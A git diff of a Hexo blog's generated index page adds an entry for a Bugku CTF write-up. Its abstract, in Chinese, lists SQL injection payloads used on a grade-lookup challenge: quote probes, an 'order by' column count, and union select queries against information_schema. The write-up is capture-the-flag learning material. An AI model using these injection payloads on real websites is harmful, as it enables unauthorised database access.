@@ -359,6 +359,38 @@ height:50vh;
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/2018/10/08/wp/" >
+            
+                <span>bugku write-up</span>
+        </a>
+        <div class="abstract-content">
+            web成绩查询先试试id=1正常输出，然后试试id=1’没有东西输出，再试试注释之后id=1’#又可以正常显示，这一题没有什么难点，也没有过滤，就是按照正常的步骤一步一步下来就行
+id=1&apos; order by 4#   //猜测列数，4列。
+id=-1&apos; union select 1,database(),2,3 #  //爆数据库名 skctf_flag
+id=-1&apos; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=d...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/10/08</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "write-up">write-up</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/2018/09/30/des加密/" >
             
                 <span>DES加密</span>
@@ -605,9 +637,18 @@ npm install hexo-c...
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 2
+        Total : 3
         </div>
         <!-- search  -->
         
@@ -617,6 +658,20 @@ npm install hexo-c...
     
     
     
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/10/08/wp/" >bugku write-up</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
@@ -639,6 +694,8 @@ npm install hexo-c...
         <span class="sidebar-tag-name" data-tags="class note"><span class="iconfont-archer">&#xe606;</span>class note</span>
     
         <span class="sidebar-tag-name" data-tags="github+hexo"><span class="iconfont-archer">&#xe606;</span>github+hexo</span>
+    
+        <span class="sidebar-tag-name" data-tags="write-up"><span class="iconfont-archer">&#xe606;</span>write-up</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -676,6 +733,8 @@ jsonContent:
         <span class="sidebar-category-name" data-categories="pki"><span class="iconfont-archer">&#xe60a;</span>pki</span>
     
         <span class="sidebar-category-name" data-categories="github-hexo"><span class="iconfont-archer">&#xe60a;</span>github-hexo</span>
+    
+        <span class="sidebar-category-name" data-categories="ctf"><span class="iconfont-archer">&#xe60a;</span>ctf</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
